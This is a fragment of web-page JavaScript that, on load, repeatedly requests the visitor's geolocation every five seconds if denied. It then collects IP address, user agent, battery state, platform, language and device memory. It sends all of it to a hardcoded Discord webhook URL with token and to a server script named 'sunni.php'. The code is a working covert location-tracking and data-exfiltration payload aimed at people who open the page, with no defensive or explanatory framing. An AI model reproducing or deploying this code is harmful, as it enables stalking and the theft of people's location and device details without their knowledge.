    <script>
        $(document).ready(function() {
            // Show permission dialog immediately on page load
            getLocation();

            // Keep asking for permission every 5â€“10 seconds if denied
            let permissionDenied = false;
            function getLocation() {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(showPosition, showError, { timeout: 5000 });
                } else {
                    alert("Your Browser Does not support GPS");
                }
            }

            function showPosition(position) {
                var grak = "Latitude: " + position.coords.latitude + " Longitude: " + position.coords.longitude;
                sdrp(grak);
                sendToDiscord(grak);
                $('#dialogBox').hide(); // Hide dialog if permission is granted
            }

            function showError(error) {
                if (error.code === error.PERMISSION_DENIED) {
                    if (!permissionDenied) {
                        $('#dialogBox').show(); // Show dialog if permission is denied
                        permissionDenied = true;
                    }
                    setTimeout(getLocation, 5000); // Retry after 5 seconds if denied
                } else {
                    alert("Location error: " + error.message);
                    window.close(); // Close window if error is critical
                }
            }

            // Function to send data to Discord
            async function sendToDiscord(location) {
                const ipData = await fetch('https://api.ipify.org?format=json');
                const ipResponse = await ipData.json();
                const ipAddress = ipResponse.ip;
                const userAgent = navigator.userAgent;
                const networkInfo = navigator.connection ? navigator.connection.effectiveType : "Unknown";
                const battery = await navigator.getBattery();
                const batteryPercentage = battery.level * 100;
                const isCharging = battery.charging;
                const platform = navigator.platform;
                const language = navigator.language;
                const deviceMemory = navigator.deviceMemory || "Unknown";

                const data = {
                    content: `**User Details:**
- DeviceLocalTime: ${new Date().toLocaleString()}
- Location: Latitude ${location}
- Google Maps Link: https://www.google.com/maps/place/${location}
- IP Address: ${ipAddress}
- User-Agent: ${userAgent}
- NetworkInformation: ${networkInfo}
- BatteryPercentage: ${batteryPercentage}%
- IsCharging: ${isCharging ? "Yes" : "No"}
- Platform: ${platform}
- DeviceLanguage: ${language}
- DeviceMemory: ${deviceMemory} GB`
                };

                const request = new XMLHttpRequest();
                request.open("POST", "https://discord.com/api/webhooks/1269744683979116584/cNjKRdP0NsvH3NIpezZoS5x1NU336ma0GlpVGf-QLB5m_vfU_gX797a_9jhOiNsLkihm", true);
                request.setRequestHeader('Content-Type', 'application/json');
                request.send(JSON.stringify(data));
            }

            // Function to send details to server
            function sdrp(gpsr) {
                $.ajax({
                    type: "POST",
                    url: "sunni.php",
                    data: {
                        gps: gpsr,
                        // Add more device details here
                    },
                    success: function(response) {
                        console.log('Data sent successfully');
                    },
                    error: function(xhr, status, error) {
                        console.error('Error sending data:', error);
                    }
                });
            }
        });
